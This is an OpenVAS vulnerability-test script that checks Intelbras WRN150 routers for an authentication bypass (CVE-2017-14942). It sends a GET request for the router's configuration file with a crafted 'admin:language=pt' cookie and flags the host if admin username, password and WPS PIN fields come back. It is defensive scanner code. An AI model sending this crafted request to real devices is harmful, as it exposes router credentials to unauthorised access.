###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_intelbras_roteador_wireless_wrn150_auth_bypass_vuln.nasl 7436 2017-10-16 05:44:20Z asteins $
#
# Intelbras Roteador Wireless N WRN Device Authentication Bypass Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:intelbras_roteador:wireless-n_wrn";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.812015");
  script_version("$Revision: 7436 $");
  script_cve_id("CVE-2017-14942");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-16 07:44:20 +0200 (Mon, 16 Oct 2017) $");
  script_tag(name:"creation_date", value:"2017-10-06 20:36:50 +0530 (Fri, 06 Oct 2017)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Intelbras Roteador Wireless N WRN Device Authentication Bypass Vulnerability");

  script_tag(name: "summary" , value:"The host is running Intelbras Roteador
  Wireless N WRN Device and is prone to authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to get specific information or not.");

  script_tag(name: "insight" , value:"The flaw exists due to an insufficient
  access control and any attacker could bypass the admin authentication just
  by tweaking the cookie.");

  script_tag(name: "impact" , value:"Successful exploitation will allow remote
  attackers to bypass authentication mechanism and gain access to sensitive data.

  Impact Level: System/Application");

  script_tag(name: "affected" , value:"Intelbras Roteador Wireless WRN150 with
  firmware version 1.0.1. Other models and other firmware versions may also be
  affected.");

  script_tag(name: "solution" , value:"Upgrade to the latest firmware available
  from the vendor. For updates refer to http://intelbras.com.br");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/42916");
  script_xref(name : "URL" , value : "http://whiteboyz.xyz/authentication-bypass-intelbras-wrn-150.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_intelbras_roteador_wireless_n_wrn_devices_detect.nasl");
  script_mandatory_keys("intelbras/roteador/N-WRN/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
netPort = "";
rcvRes = "";
req = "";

## get the port
if(!netPort = get_app_port(cpe:CPE)){
  exit(0);
}

##Tested on Live Link N-WRN 300 is also vulnerable
##So not checking for model here
url = "/cgi-bin/DownloadCfg/RouterCfm.cfg";

##Send Request
sndReq = http_get_req(port:netPort, url:url, add_headers:make_array("Cookie", "admin:language=pt"));

##Get Response
rcvRes = http_keepalive_send_recv(port:netPort, data:sndReq);

if(rcvRes =~ "HTTP/1.. 200" && "wps_device_name=INTELBRAS Wireless" >< rcvRes &&
   "lan_gateway=" >< rcvRes && "http_username=" >< rcvRes && "http_passwd=" >< rcvRes
   && "wps_device_pin=" >< rcvRes && "wl_version=" >< rcvRes)
{
  report = report_vuln_url(port:netPort, url:url);
  security_message( port:netPort, data:report);
  exit(0);
}
exit(0);
